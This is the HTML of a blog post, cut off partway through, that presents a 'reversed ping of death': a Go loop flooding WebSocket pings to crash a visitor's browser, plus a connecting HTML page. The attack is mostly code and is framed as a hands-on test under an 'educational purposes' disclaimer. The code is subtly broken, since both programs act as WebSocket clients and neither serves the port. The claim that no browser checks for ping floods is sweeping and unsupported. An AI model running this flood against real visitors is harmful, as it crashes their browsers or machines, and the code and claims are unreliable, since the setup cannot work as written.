<!DOCTYPE html><html class="font-sans scroll-smooth" lang=en-US><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,viewport-fit=cover" name=viewport><link href=/icons/favicon.svg rel=icon type=image/svg+xml><title>WebSockets Reversed Ping of Death | Simplecode Blog</title><meta content="WebSockets Reversed Ping of Death" name=description><meta content=Simplecode name=author><meta content="Astro v5.9.2" name=generator><meta content="oklch(96% 0.005 298)" name=theme-color><link href=/fonts/EarlySummer-VF-Split/EarlySummer-VF-Subset.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/fonts/Snell-Black-SF.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/fonts/Snell-Bold-SF.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/fonts/STIX-VF.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/fonts/STIX-Italic-VF.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/_astro/photoswipe.cPPnkASS.css rel=preload as=style><link href=/_astro/katex.min.COXD5gRV.css rel=preload as=style><link href=/_astro/photoswipe.cPPnkASS.css rel=stylesheet media=print onload="this.media=&#34;all&#34;"><link href=/_astro/katex.min.COXD5gRV.css rel=stylesheet media=print onload="this.media=&#34;all&#34;"><link href=/rss.xml rel=alternate type=application/rss+xml title="RSS Feed"><link href=/atom.xml rel=alternate type=application/atom+xml title="Atom Feed"><link href=/sitemap-index.xml rel=sitemap><link href=https://blog.simplecode.gr/posts/websockets-reversed-ping-of-death/ rel=canonical><link href=https://blog.simplecode.gr rel=alternate hreflang=en><meta content=article property=og:type><meta content=https://blog.simplecode.gr/posts/websockets-reversed-ping-of-death/ property=og:url><meta content="WebSockets Reversed Ping of Death | Simplecode Blog" property=og:title><meta content="WebSockets Reversed Ping of Death" property=og:description><meta content=https://blog.simplecode.gr/og/websockets-reversed-ping-of-death.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@radishzz_ name=twitter:site><meta content=true name=astro-view-transitions-enabled><meta content=none name=astro-view-transitions-fallback><script type=module src=/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CLDwYp7M.js></script><script>!function(){function e(e=document){const t=function(){const e=localStorage.getItem("theme");return!!e&&"dark"===e}();e.documentElement.classList.toggle("dark",t);const n=e.head.querySelector('meta[name="theme-color"]');n?.setAttribute("content",t?"oklch(22% 0.005 298)":"oklch(96% 0.005 298)")}e(),document.addEventListener("astro:before-swap",(({newDocument:t})=>{e(t)})),window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",(({matches:t})=>{localStorage.setItem("theme",t?"dark":"light"),e(),document.dispatchEvent(new Event("theme-changed"))}))}()</script><link href=/_astro/_about_.JZC2AF3c.css rel=stylesheet><link href=/_astro/_posts_slug_.Wk4PvIPr.css rel=stylesheet><script type=module src=/_astro/page.BNYwb576.js></script><script>!function(t,e,n,r){(window.crossOriginIsolated||navigator.serviceWorker)&&((r=t[e]=Object.assign(t[e]||{},{lib:"/~partytown/",debug:!1}))[n]=(r[n]||[]).concat(["dataLayer.push","gtag"]))}(window,"partytown","forward");const t={preserveBehavior:!1},e=e=>{if("string"==typeof e)return[e,t];const[n,r=t]=e;return[n,{...t,...r}]},n=Object.freeze((()=>{const t=new Set;let e=[];do{Object.getOwnPropertyNames(e).forEach((n=>{"function"==typeof e[n]&&t.add(n)}))}while((e=Object.getPrototypeOf(e))!==Object.prototype);return Array.from(t)})());!function(t,r,o,i,a,s,c,d,l,p,u=t,f){function y(){f||(f=1,"/"==(c=(s.lib||"/~partytown/")+(s.debug?"debug/":""))[0]&&(l=r.querySelectorAll('script[type="text/partytown"]'),i!=t?i.dispatchEvent(new CustomEvent("pt1",{detail:t})):(d=setTimeout(h,(null==s?void 0:s.fallbackTimeout)||1e4),r.addEventListener("pt0",b),a?w(1):o.serviceWorker?o.serviceWorker.register(c+(s.swPath||"partytown-sw.js"),{scope:c}).then((function(t){t.active?w():t.installing&&t.installing.addEventListener("statechange",(function(t){"activated"==t.target.state&&w()}))}),console.error):h())))}function w(e){p=r.createElement(e?"script":"iframe"),t._pttab=Date.now(),e||(p.style.display="block",p.style.width="0",p.style.height="0",p.style.border="0",p.style.visibility="hidden",p.setAttribute("aria-hidden",!0)),p.src=c+"partytown-"+(e?"atomics.js?v=0.11.1":"sandbox-sw.html?"+t._pttab),r.querySelector(s.sandboxParent||"body").appendChild(p)}function h(n,o){for(b(),i==t&&(s.forward||[]).map((function(n){const[r]=e(n);delete t[r.split(".")[0]]})),n=0;n<l.length;n++)(o=r.createElement("script")).innerHTML=l[n].innerHTML,o.nonce=s.nonce,r.head.appendChild(o);p&&p.parentNode.removeChild(p)}function b(){clearTimeout(d)}s=t.partytown||{},i==t&&(s.forward||[]).map((function(r){const[o,{preserveBehavior:i}]=e(r);u=t,o.split(".").map((function(e,r,o){var a;u=u[o[r]]=r+1<o.length?u[o[r]]||(a=o[r+1],n.includes(a)?[]:{}):(()=>{let e=null;if(i){const{methodOrProperty:n,thisObject:r}=((t,e)=>{let n=t;for(let t=0;t<e.length-1;t+=1)n=n[e[t]];return{thisObject:n,methodOrProperty:e.length>0?n[e[e.length-1]]:void 0}})(t,o);"function"==typeof n&&(e=(...t)=>n.apply(r,...t))}return function(){let n;return e&&(n=e(arguments)),(t._ptf=t._ptf||[]).push(o,arguments),n}})()}))})),"complete"==r.readyState?y():(t.addEventListener("DOMContentLoaded",y),t.addEventListener("load",y))}(window,document,navigator,top,window.crossOriginIsolated),document.addEventListener("astro:before-swap",(t=>{let e=document.body.querySelector("iframe[src*='/~partytown/']");e&&t.newDocument.body.append(e)}))</script><style>[data-astro-transition-scope=astro-va26yt7w-1]{view-transition-name:post-websockets-reversed-ping-of-death-en}@layer astro{::view-transition-old(post-websockets-reversed-ping-of-death-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}::view-transition-new(post-websockets-reversed-ping-of-death-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}[data-astro-transition=back]::view-transition-old(post-websockets-reversed-ping-of-death-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}[data-astro-transition=back]::view-transition-new(post-websockets-reversed-ping-of-death-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}}[data-astro-transition-fallback=old] [data-astro-transition-scope=astro-va26yt7w-1],[data-astro-transition-fallback=old][data-astro-transition-scope=astro-va26yt7w-1]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}[data-astro-transition-fallback=new] [data-astro-transition-scope=astro-va26yt7w-1],[data-astro-transition-fallback=new][data-astro-transition-scope=astro-va26yt7w-1]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}[data-astro-transition=back][data-astro-transition-fallback=old] [data-astro-transition-scope=astro-va26yt7w-1],[data-astro-transition=back][data-astro-transition-fallback=old][data-astro-transition-scope=astro-va26yt7w-1]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}[data-astro-transition=back][data-astro-transition-fallback=new] [data-astro-transition-scope=astro-va26yt7w-1],[data-astro-transition=back][data-astro-transition-fallback=new][data-astro-transition-scope=astro-va26yt7w-1]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}</style><style>[data-astro-transition-scope=astro-aqc54ihn-2]{view-transition-name:time-websockets-reversed-ping-of-death-en}@layer astro{::view-transition-old(time-websockets-reversed-ping-of-death-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}::view-transition-new(time-websockets-reversed-ping-of-death-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}[data-astro-transition=back]::view-transition-old(time-websockets-reversed-ping-of-death-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}[data-astro-transition=back]::view-transition-new(time-websockets-reversed-ping-of-death-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}}[data-astro-transition-fallback=old] [data-astro-transition-scope=astro-aqc54ihn-2],[data-astro-transition-fallback=old][data-astro-transition-scope=astro-aqc54ihn-2]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}[data-astro-transition-fallback=new] [data-astro-transition-scope=astro-aqc54ihn-2],[data-astro-transition-fallback=new][data-astro-transition-scope=astro-aqc54ihn-2]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}[data-astro-transition=back][data-astro-transition-fallback=old] [data-astro-transition-scope=astro-aqc54ihn-2],[data-astro-transition=back][data-astro-transition-fallback=old][data-astro-transition-scope=astro-aqc54ihn-2]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}[data-astro-transition=back][data-astro-transition-fallback=new] [data-astro-transition-scope=astro-aqc54ihn-2],[data-astro-transition=back][data-astro-transition-fallback=new][data-astro-transition-scope=astro-aqc54ihn-2]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}</style><style>[data-astro-transition-scope=astro-wif6pdce-3]{view-transition-name:site-title-en}@layer astro{::view-transition-old(site-title-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}::view-transition-new(site-title-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}[data-astro-transition=back]::view-transition-old(site-title-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}[data-astro-transition=back]::view-transition-new(site-title-en){animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}}[data-astro-transition-fallback=old] [data-astro-transition-scope=astro-wif6pdce-3],[data-astro-transition-fallback=old][data-astro-transition-scope=astro-wif6pdce-3]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}[data-astro-transition-fallback=new] [data-astro-transition-scope=astro-wif6pdce-3],[data-astro-transition-fallback=new][data-astro-transition-scope=astro-wif6pdce-3]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}[data-astro-transition=back][data-astro-transition-fallback=old] [data-astro-transition-scope=astro-wif6pdce-3],[data-astro-transition=back][data-astro-transition-fallback=old][data-astro-transition-scope=astro-wif6pdce-3]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeOut}[data-astro-transition=back][data-astro-transition-fallback=new] [data-astro-transition-scope=astro-wif6pdce-3],[data-astro-transition=back][data-astro-transition-fallback=new][data-astro-transition-scope=astro-wif6pdce-3]{animation-duration:180ms;animation-timing-function:cubic-bezier(0.76,0,0.24,1);animation-fill-mode:both;animation-name:astroFadeIn}</style></head><body><div class="max-w-205.848 min-h-dvh min-h-vh mx-auto w-full" lg="mx-[max(5.75rem,calc(50vw-34.25rem))] my-20 max-w-[min(calc(75vw-16rem),44rem)] min-h-full p-0" p="x-[min(7.25vw,3.731rem)] y-10"><header class="cjk:tracking-0.02em lg:uno-desktop-column lg:top-20 mb-10.8"><h2 class="c-secondary font-bold font-title lg:c-primary lg:mb-1.8 lg:mt-0 lg:text-9 mb-2.8 mt-3 text-5.375"><div class="inline-block box-content pr-1" data-astro-transition-scope=astro-wif6pdce-3 data-disable-theme-transition><a href=/ id=site-title-link>Simplecode Blog</a></div></h2></header><nav aria-label="Site Navigation" class="cjk:tracking-0.02em lg:uno-desktop-column font-navbar font-semibold hidden leading-2.45em lg:block lg:bottom-50 lg:text-4 mb-10.5 text-3.6"><ul><li><a href=/ class="c-primary after:bottom-0.7em font-bold highlight-static">Posts</a></li><li><a href=/tags/ class="hover:c-primary highlight-hover transition-colors after:bottom-0.7em hover:font-bold transition-font-weight">Tags</a></li><li><a href=/about/ class="hover:c-primary highlight-hover transition-colors after:bottom-0.7em hover:font-bold transition-font-weight">About</a></li></ul></nav><main class=mb-12><article class="heti mb-12.6"><div class=relative><button aria-label="Go back" class=hidden id=back-button lg="absolute left--10 top-3.8 block aspect-square w-4.5 c-secondary/40 transition-colors ease-out hover:c-secondary/80 active:scale-90!"><svg aria-hidden=true fill=currentColor viewBox="0 0 24 24"><path d=M17.8.7L4,12l13.8,11.4.7-.9L7.2,12,18.5,1.5l-.7-.8Z /></svg></button><script type=module>function t(){document.getElementById("back-button")?.addEventListener("click",(()=>{window.history.length>1?window.history.back():document.getElementById("site-title-link")?.click()}))}t(),document.addEventListener("astro:after-swap",t)</script><h1 class=post-title><span data-astro-transition-scope=astro-va26yt7w-1 data-disable-theme-transition>WebSockets Reversed Ping of Death</span></h1></div><div class="c-primary block font-time mb-17.2" data-astro-transition-scope=astro-aqc54ihn-2 data-disable-theme-transition id=gsap-post-page-date><time datetime=2025-06-09>2025-06-09 </time><span class=ml-1.75>4 min</span></div><script type=module>function h(){if(!(window.innerWidth>=1536))return;const t=document.getElementById("toc-accordion-content");if(!t)return;const n=t.getElementsByTagName("a");if(0===n.length)return;const e=Array.from(n,(t=>t)),o=e.some((t=>t.classList.contains("toc-links-h2")))?"toc-links-h2":"toc-links-h3",s=new Map;e.forEach((t=>{const n=t.getAttribute("href")?.substring(1);n&&s.set(n,t)}));let c=null;function i(t){t!==c&&(e.forEach((t=>{t.classList.remove("toc-link-active")})),t.classList.add("toc-link-active"),t.classList.contains(o)||function(t){for(let n=e.indexOf(t)-1;n>=0;n--){const t=e[n];if(t.classList.contains(o)){t.classList.add("toc-link-active");break}}}(t),c=t,t.scrollIntoView({behavior:"smooth",block:"center"}))}const r=new IntersectionObserver((t=>{const n=t.find((t=>t.isIntersecting))?.target?.id;if(n){const t=s.get(n);t&&i(t)}}),{rootMargin:"0% 0% -66% 0%",threshold:[.4]});Array.from(document.querySelectorAll("h2, h3, h4")).filter((t=>t.id&&"footnotes"!==t.id)).forEach((t=>r.observe(t))),e.length>0&&i(e[0])}h(),document.addEventListener("astro:after-swap",h)</script><div id=gsap-post-page-content><p><strong>Warning:</strong> The following action may cause a visitor’s browser or even their computer to crash. This information is provided for educational purposes only. Use it responsibly.</p><p>I do not encourage or condone the misuse of this knowledge, and I disclaim any responsibility for any damage, disruption, or unintended consequences resulting from its use. Proceed at your own risk.</p><hr><p>One of the first things someone learns in martial arts is that when you hold someone, that someone holds you too. If, for example, that someone falls on purpose while you’re holding them tightly, chances are you might fall too.</p><p>Even though there isn’t a special name for this idea, it can be found in Aiki martial arts principle, where the main point is that the opponent’s energy becomes a tool in your hands if you redirect it wisely.</p><p>When you write a program that handles WebSocket connections, one of the main security concerns is preventing a client from flooding you with messages or pings with bad intentions.</p><p>But what if I told you that, on the other side, no browser checks if someone attacks with abnormal load of WebSocket messages or pings in bad faith — and just ends up crashing?</p><hr><p>You can easily test this yourself:</p><ol><li><p>Bookmark this page first, so you can return after a crash.</p></li><li><p>Write a Go program that opens a WebSocket connection and continuously sends pings in a highly repetitive loop:</p></li></ol><div class=code-block-wrapper><button aria-label="Copy code" class=code-copy-button type=button></button><pre class="astro-code astro-code-themes github-dark github-light" data-copy-button-added=true data-language=go style=background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d;--shiki-dark:#6A737D>// main.go</span></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>package</span><span style=color:#6f42c1;--shiki-dark:#B392F0> main</span></span>
<span class=line></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>import</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (</span></span>
<span class=line><span style=color:#032f62;--shiki-dark:#9ECBFF>    "</span><span style=color:#6f42c1;--shiki-dark:#B392F0>log</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"</span></span>
<span class=line><span style=color:#032f62;--shiki-dark:#9ECBFF>    "</span><span style=color:#6f42c1;--shiki-dark:#B392F0>github.com/gorilla/websocket</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>func</span><span style=color:#6f42c1;--shiki-dark:#B392F0> main</span><span style=color:#24292e;--shiki-dark:#E1E4E8>() {</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>    url </span><span style=color:#d73a49;--shiki-dark:#F97583>:=</span><span style=color:#032f62;--shiki-dark:#9ECBFF> "ws://localhost:3001"</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>    conn, _, err </span><span style=color:#d73a49;--shiki-dark:#F97583>:=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> websocket.DefaultDialer.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>Dial</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(url, </span><span style=color:#005cc5;--shiki-dark:#79B8FF>nil</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>    if</span><span style=color:#24292e;--shiki-dark:#E1E4E8> err </span><span style=color:#d73a49;--shiki-dark:#F97583>!=</span><span style=color:#005cc5;--shiki-dark:#79B8FF> nil</span><span style=color:#24292e;--shiki-dark:#E1E4E8> {</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        log.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>Fatal</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"Error connecting to WebSocket:"</span><span style=color:#24292e;--shiki-dark:#E1E4E8>, err)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>    }</span></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>    defer</span><span style=color:#24292e;--shiki-dark:#E1E4E8> conn.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>Close</span><span style=color:#24292e;--shiki-dark:#E1E4E8>()</span></span>
<span class=line></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>    for</span><span style=color:#24292e;--shiki-dark:#E1E4E8> {</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        err </span><span style=color:#d73a49;--shiki-dark:#F97583>:=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> conn.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>WriteMessage</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(websocket.PingMessage, </span><span style=color:#005cc5;--shiki-dark:#79B8FF>nil</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>        if</span><span style=color:#24292e;--shiki-dark:#E1E4E8> err </span><span style=color:#d73a49;--shiki-dark:#F97583>!=</span><span style=color:#005cc5;--shiki-dark:#79B8FF> nil</span><span style=color:#24292e;--shiki-dark:#E1E4E8> {</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>            log.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>Println</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"Error sending ping:"</span><span style=color:#24292e;--shiki-dark:#E1E4E8>, err)</span></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>            return</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        }</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>    }</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>}</span></span></code></pre></div><ol start=3><li>Write an HTML page that connects to this WebSocket connection:</li></ol><div class=code-block-wrapper><button aria-label="Copy code" class=code-copy-button type=button></button><pre class="astro-code astro-code-themes github-dark github-light" data-copy-button-added=true data-language=html style=background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d;--shiki-dark:#6A737D>&#x3C;!-- index.html --></span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>&#x3C;!</span><span style=color:#22863a;--shiki-dark:#85E89D>DOCTYPE</span><span style=color:#6f42c1;--shiki-dark:#B392F0> html</span><span style=color:#24292e;--shiki-dark:#E1E4E8>></span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>&#x3C;</span><span style=color:#22863a;--shiki-dark:#85E89D>html</span><span style=color:#6f42c1;--shiki-dark:#B392F0> lang</span><span style=color:#24292e;--shiki-dark:#E1E4E8>=</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"en"</span><span style=color:#24292e;--shiki-dark:#E1E4E8>></span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>&#x3C;</span><span style=color:#22863a;--shiki-dark:#85E89D>head</span><span style=color:#24292e;--shiki-dark:#E1E4E8>></span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>    &#x3C;</span><span style=color:#22863a;--shiki-dark:#85E89D>meta</span><span style=color:#6f42c1;--shiki-dark:#B392F0> charset</span><span style=color:#24292e;--shiki-dark:#E1E4E8>=</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"UTF-8"</span><span style=color:#24292e;--shiki-dark:#E1E4E8> /></span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>    &#x3C;</span><span style=color:#22863a;--shiki-dark:#85E89D>meta</span><span style=color:#6f42c1;--shiki-dark:#B392F0> name</span><span style=color:#24292e;--shiki-dark:#E1E4E8>=</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"viewport"</span><span style=color:#6f42c1;--shiki-dark:#B392F0> content</span><span style=color:#24292e;--shiki-dark:#E1E4E8>=</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"width=device-width, initial-scale=1"</span><span style=color:#24292e;--shiki-dark:#E1E4E8> /></span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>    &#x3C;</span><span style=color:#22863a;--shiki-dark:#85E89D>title</span><span style=color:#24292e;--shiki-dark:#E1E4E8>>WebSocket Reversed Ping of Death&#x3C;/</span><span style=color:#22863a;--shiki-dark:#85E89D>title</span><span style=color:#24292e;--shiki-dark:#E1E4E8>></span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>&#x3C;/</span><span style=color:#22863a;--shiki-dark:#85E89D>head</span><span style=color:#24292e;--shiki-dark:#E1E4E8>></span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>&#x3C;</span><span style=color:#22863a;--shiki-dark:#85E89D>body</span><span style=color:#24292e;--shiki-dark:#E1E4E8>></span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>    &#x3C;</span><span style=color:#22863a;--shiki-dark:#85E89D>h1</span><span style=color:#24292e;--shiki-dark:#E1E4E8>>WebSocket Reversed Ping of Death&#x3C;/</span><span style=color:#22863a;--shiki-dark:#85E89D>h1</span><span style=color:#24292e;--shiki-dark:#E1E4E8>></span></span>
<span class=line></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>    &#x3C;</span><span style=color:#22863a;--shiki-dark:#85E89D>script</span><span style=color:#24292e;--shiki-dark:#E1E4E8>></span></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>        const</span><span style=color:#005cc5;--shiki-dark:#79B8FF> socket</span><span style=color:#d73a49;--shiki-dark:#F97583> =</span><span style=color:#d73a49;--shiki-dark:#F97583> new</span><span style=color:#6f42c1;--shiki-dark:#B392F0> WebSocket</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"ws://localhost:3001/ws"</span><span style=color:#24292e;--shiki-dark:#E1E4E8>);</span></span>
<span class=line></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        socket.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>onerror</span><span style=color:#d73a49;--shiki-dark:#F97583> =</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (</span><span style=color:#e36209;--shiki-dark:#FFAB70>error</span><span style=color:#24292e;--shiki-dark:#E1E4E8>) </span><span style=color:#d73a49;--shiki-dark:#F97583>=></span><span style=color:#24292e;--shiki-dark:#E1E4E8> {</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>            console.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>error</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"WebSocket error:"</span><span style=color:#24292e;--shiki-dark:#E1E4E8>, error);</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        };</span></span>
<span class=line></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        socket.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>onopen</span><span style=color:#d73a49;--shiki-dark:#F97583> =</span><span style=color:#24292e;--shiki-dark:#E1E4E8> () </span><span style=color:#d73a49;--shiki-dark:#F97583>=></span><span style=color:#24292e;--shiki-dark:#E1E4E8> {</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>            console.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>log</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"WebSocket connected."</span><span style=color:#24292e;--shiki-dark:#E1E4E8>);</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        };</span></span>
<span class=line></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        socket.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>onclose</span><span style=color:#d73a49;--shiki-dark:#F97583> =</span><span style=color:#24292e;--shiki-dark:#E1E4E8> () </span><span style=color:#d73a49;--shiki-dark:#F97583>=></span><span style=color:#24292e;--shiki-dark:#E1E4E8> {</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>            console.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>log</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"WebSocket closed."</span><span style=color:#24292e;--shiki-dark:#E1E4E8>);</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        };</span></span>
<span class=line></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        socket.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>onmessage</span><span style=color:#d73a49;--shiki-dark:#F97583> =</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (</span><span style=color:#e36209;--shiki-dark:#FFAB70>event</span><span style=color:#24292e;--shiki-dark:#E1E4E8>) </span><span style=color:#d73a49;--shiki-dark:#F97583>=></span><span style=color:#24292e;--shiki-dark:#E1E4E8> {</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>            console.</span><span style=color:#6f42c1;--shiki-dark:#B392F0>log</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"WebSocket received:"</span><span style=color:#24292e;--shiki-dark:#E1E4E8>, event.data);</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        };</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>    &#x3C;/</span><span style=color:#22863a;--shiki-dark:#85E89D>script</span><span style=color:#24292e;--shiki-dark:#E1E4E8>></span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>&#x3C;/</span><span style=color:#22863a;--shiki-dark:#85E89D>body</span><span style=color:#24292e;--shiki-dark:#E1E4E8>></span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>&#x3C;/</span><span style=color:#22863a;--shiki-dark:#85E89D>html</span><span style=color:#24292e;--shiki-dark:#E1E4E8>></span></span></code></pre></div><ol start=4><li>Run the Go program:</li></ol><div class=code-block-wrapper><button aria-label="Copy code" class=code-copy-button type=button></button><pre class="astro-code astro-code-themes github-dark github-light" data-copy-button-added=true data-language=bash style=background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6f42c1;--shiki-dark:#B392F0>go</span><span style=color:#032f62;--shiki-dark:#9ECBFF> mod</span><span style=color:#032f62;--shiki-dark:#9ECBFF> init</span><span style=color:#032f62;--shiki-dark:#9ECBFF> main</span></span>
<span class=line><span style=color:#6f42c1;--shiki-dark:#B392F0>go</span><span style=color:#032f62;--shiki-dark:#9ECBFF> mod</span><span style=color:#032f62;--shiki-dark:#9ECBFF> tidy</span></span>
